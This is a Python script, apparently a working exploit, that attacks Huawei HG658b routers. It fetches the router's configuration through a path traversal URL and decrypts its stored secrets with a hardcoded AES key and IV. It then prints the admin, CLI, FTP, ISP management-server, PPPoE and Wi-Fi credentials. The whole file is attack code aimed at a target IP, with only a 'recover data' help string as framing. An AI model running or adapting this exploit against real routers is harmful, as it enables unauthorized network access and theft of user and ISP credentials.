import requests
from lxml import etree
import base64
import pyaes
import netifaces
import argparse
import codecs

# Encryption data for this router
iv = buffer(bytearray.fromhex('8049E91025A6B54876C3B4868090D3FC'))
aes_key = buffer(bytearray.fromhex('3E4F5612EF64305955D543B0AE350880'))


# Decrypts the input data and returns it 
def decrypt_data(raw_data):
	decoded = base64.b64decode(raw_data)
	cipher = pyaes.AESModeOfOperationCBC(aes_key, iv = iv)
	return cipher.decrypt(decoded)


# Takes a etree element object and a list of fields as inputs
# Returns a dictionary containing data from the element. The data is extracted according to the fields list
# The format of a field is: { 'name': 'fieldName', 'alias': 'fieldAlias', 'encrypted': False, 'is_bool': False}
# Where name is the name of the field in the element and alias is the name of the field in the resulting dictionary
# If encrypted is true the data will also get decrypted (using the decrypt_data function)
# If is_bool is true the data will get converted from 0/1 to False/True
def extract_fields(data, fields):
	result = {}

	for field in fields:
		if field['encrypted']:
			result[field['alias']] = decrypt_data(data[field['name']])
		elif field['is_bool']:
			if data[field['name']] is '1':
				result[field['alias']] = True
			else:
				result[field['alias']] = False
		else:
			result[field['alias']] = data[field['name']] 

	return result


# Takes an etree element object containing the full config data of the router
# Returns a dictionary containing relevant fields for the FTP service
def get_ftp_data(config_data):
	ftp_data = config_data.find('DeviceInfo').find('X_ServiceManage').attrib
	fields = [
		{ 'name': 'FtpUserName', 'alias': 'username', 'encrypted': False, 'is_bool': False},
		{ 'name': 'FtpPassword', 'alias': 'password', 'encrypted': True, 'is_bool': False},
		{ 'name': 'FtpEnable', 'alias': 'enabled', 'encrypted': False, 'is_bool': True}
	]
	
	result = extract_fields(ftp_data, fields)
		
	return result


# Takes an etree element object containing the full config data of the router
# Returns a dictionary containing relevant fields for the management server
def get_management_server_data(config_data):
	management_data = config_data.find('ManagementServer').attrib
	fields = [
		{ 'name': 'URL', 'alias': 'url', 'encrypted': False, 'is_bool': False},
		{ 'name': 'Username', 'alias': 'username', 'encrypted': False, 'is_bool': False},
		{ 'name': 'Password', 'alias': 'password', 'encrypted': True, 'is_bool': False},
		{ 'name': 'ConnectionRequestUsername', 'alias': 'connection_request_username', 'encrypted': False, 'is_bool': False},
		{ 'name': 'ConnectionRequestPassword', 'alias': 'connection_request_password', 'encrypted': True, 'is_bool': False},
		{ 'name': 'STUNEnable', 'alias': 'stun_enabled', 'encrypted': False, 'is_bool': True},
		{ 'name': 'STUNServerPort', 'alias': 'stun_port', 'encrypted': False, 'is_bool': False},
		{ 'name': 'STUNUsername', 'alias': 'stun_username', 'encrypted': False, 'is_bool': False},
		{ 'name': 'STUNPassword', 'alias': 'stun_password', 'encrypted': True, 'is_bool': False}
	]

	result = extract_fields(management_data, fields)

	return result


# Takes an etree element object containing the data of a single user
# Returns a dictionary containing relevant fields for that user
def get_user_data(raw_user_data):
	user_data = raw_user_data.attrib
	fields = [
		{ 'name': 'Userlevel', 'alias': 'level', 'encrypted': False, 'is_bool': False},
		{ 'name': 'Username', 'alias': 'username', 'encrypted': False, 'is_bool': False},
		{ 'name': 'Userpassword', 'alias': 'password', 'encrypted': True, 'is_bool': False}
	]

	result = extract_fields(user_data, fields)

	return result


# Takes an etree element object containing the full config data of the router
# Returns a dictionary containing the number of Web UI users and a list of existing Web UIusers
def get_web_users_data(config_data):
	result = {}

	users_data = config_data.find('UserInterface').find('X_Web').find('UserInfo')
	nr_of_users = int(users_data.attrib['NumberOfInstances'])

	result['number_of_users'] = nr_of_users 
	result['users'] = []
	for user_data in users_data.findall('UserInfoInstance'):
		result['users'].append(get_user_data(user_data))

	return result


# Takes an etree element object containing the full config data of the router
# Returns a dictionary containing the number of CLI users and a list of existing CLI users
def get_cli_users_data(config_data):
	result = {}

	users_data = config_data.find('UserInterface').find('X_Cli').find('UserInfo')
	nr_of_users = int(users_data.attrib['NumberOfInstances'])

	result['number_of_users'] = nr_of_users 
	result['users'] = []
	for user_data in users_data.findall('UserInfoInstance'):
		result['users'].append(get_user_data(user_data))

	return result


# Takes an etree element object containing the data of a single WLAN
# Returns a dictionary containing relevant fields for that WLAN
def get_wlan_data(raw_wlan_data):
	wlan_data = raw_wlan_data.attrib
	fields = [
		{ 'name': 'InstanceID', 'alias': 'id', 'encrypted': False, 'is_bool': False},
		{ 'name': 'Enable', 'alias': 'enabled', 'encrypted': False, 'is_bool': True},
		{ 'name': 'SSID', 'alias': 'SSID', 'encrypted': False, 'is_bool': False}
	]

	result = extract_fields(wlan_data, fields)

	if raw_wlan_data.find('WPS').attrib['Enable'] is '1':
		result['wps_enabled'] = True
	else:
		result['wps_enabled'] = False

	for wep_key in raw_wlan_data.find('WEPKey').findall('WEPKeyInstance'):
		result['wep_key_'+wep_key.attrib['InstanceID']] = decrypt_data(wep_key.attrib['WEPKey'])

	for preshared_key in raw_wlan_data.find('PreSharedKey').findall('PreSharedKeyInstance'):
		result['preshared_key_'+preshared_key.attrib['InstanceID']] = decrypt_data(preshared_key.attrib['PreSharedKey'])

	return result


# Takes an etree element object containing the full config data of the router
# Returns a dictionary containing the number of WLANs and a list of these WLANs
def get_wlans_data(config_data):
	result = {}

	wlans_data = config_data.find('LANDevice').find('LANDeviceInstance').find('WLANConfiguration')
	result['number_of_wlans'] = wlans_data.attrib['NumberOfInstances']
	result['wlans'] = []
	for wlan_data in wlans_data.findall('WLANConfigurationInstance'):
		result['wlans'].append(get_wlan_data(wlan_data))

	return result


# Takes an etree element object containing the full config data of the router
# Returns a dictionary containing relevant fields for the PPPoe service if it is found
def get_pppoe_data(config_data):
	result = {}

	connection_devices = config_data.find('WANDevice').findall('WANDeviceInstance')
	for connection_device in connection_devices:
		if connection_device.find('WANConnectionDevice') is not None:
			instances = connection_device.find('WANConnectionDevice').findall('WANConnectionDeviceInstance')
			for instance in instances:
				if instance.find('WANPPPConnection') is not None:
					#print 'PPPoE data found'
					for pppoe_connection in instance.find('WANPPPConnection').findall('WANPPPConnectionInstance'):
						result['username'] = pppoe_connection.attrib['Username']
						result['password'] = decrypt_data(pppoe_connection.attrib['Password'])

	return result


# Gets the config from the router by using a path traversal attack
def get_config(router_address):
	print('Trying to obtain the config file by using a path traversal ...')
	config_path = '/images/.../...//.../...//config/currentcfg'
	response = requests.get('http://' + router_address + config_path)
	if response.status_code is 200:
		print('Config file obtained.')
	else:
		print('ERROR: Failed to obtain data. Your router is not vulnerable to the path traversal attack')
		exit()
	
	xml_data = response.text[4:-2]
	tree = etree.fromstring(xml_data)
	config_data = tree.find('InternetGatewayDevice')

	# Dump xml config for debug purposes
	if args.dump_config:
		outfile = codecs.open(args.dump_config,'w','utf-8')
		outfile.write(xml_data)
		outfile.close()
	
	return config_data


if __name__=='__main__':
	parser = argparse.ArgumentParser('A simple script that can be used to recover data from Huawei HG658b routers.')

	parser.add_argument('--target',
					help = 'The IP address of the router. If none is provided the default gateway will be used',
					required = False)

	parser.add_argument('--complete_data',
					help = 'If this argument is used more information will be printed (management server data, CLI users, disabled WLANs)',
					action='store_true',
					required = False)

	parser.add_argument('--dump_config',
					help = 'Path where you want the xml config to be written. This should be used for debugging purposes. The config cannot be uploaded back!',
					required = False)

	args = parser.parse_args()

	# If a target is not provided try to use the default gateway IP
	if not args.target:
		gateways = netifaces.gateways()

		args.target = gateways['default'][netifaces.AF_INET][0]
		print('No target provided. Trying to use the default gateway (' + args.target + ')')


	config_data = get_config(args.target)

	# If the user requested it, print complete data
	if args.complete_data:
		ftp_data = get_ftp_data(config_data)
		if ftp_data['enabled']:
			print('FTP is enabled')
			print('Username: ' + ftp_data['username'])
			print('Password: ' + ftp_data['password'])
		else:
			print('FTP is disabled')
		
		management_data = get_management_server_data(config_data)
		print '\n--Management server data--'
		print('URL: ' + management_data['url'])	
		print('Username: ' + management_data['username'])
		print('Password: ' + management_data['password'])
		print '\n--Management server data: Connection Requst--'
		print('Username: ' + management_data['connection_request_username'])
		print('Password: ' + management_data['connection_request_password'])
		print '\n--Management server data: STUN --'
		if management_data['stun_enabled']:
			print('STUN is enabled')
		else:
			print('STUN is disabled')
		print('Port: ' + management_data['stun_port'])
		print('Username: ' + management_data['stun_username'])
		print('Password: ' + management_data['stun_password'])
		

		cli_users_data = get_cli_users_data(config_data)
		print '\n-- CLI users --'
		print str(cli_users_data['number_of_users']) + ' users found'
		for user in cli_users_data['users']:
			print('') # Print a newline
			print('Username: ' + user['username'] )
			print('Password: ' + user['password'] )
			print('Level of access: ' + user['level'] )

	# Basic data - this should always be printed
	web_users_data = get_web_users_data(config_data)
	print('\n-- Web UI users--')
	print(str(web_users_data['number_of_users']) + ' users found')
	for user in web_users_data['users']:
		print('') # Print a newline
		print('Username: ' + user['username'] )
		print('Password: ' + user['password'] )
		print('Level of access: ' + user['level'] )

	pppoe_data = get_pppoe_data(config_data)
	print('\n-- PPPOE data--')
	print('Username: ' + pppoe_data['username'])
	print('Password: ' + pppoe_data['password'])

	wlan_data = get_wlans_data(config_data)
	print '\n-- Wireless LAN data--'
	print str(wlan_data['number_of_wlans']) + ' wireless LANs found'
	for wlan in wlan_data['wlans']:
		print('')
		if wlan['enabled']:
			print('WLAN ' + wlan['id'] + ' is enabled')
		else:
			print('WLAN ' + wlan['id'] + ' is disabled')

		if wlan['enabled'] or args.complete_data:
			print('ID: ' + wlan['id'])
			print('SSID: ' + wlan['SSID'])
			print('Password: ' + wlan['preshared_key_1'])
			if wlan['wps_enabled']:
				print('WPS is enabled for this network')
			else:
				print('WPS is disabled for this network')

		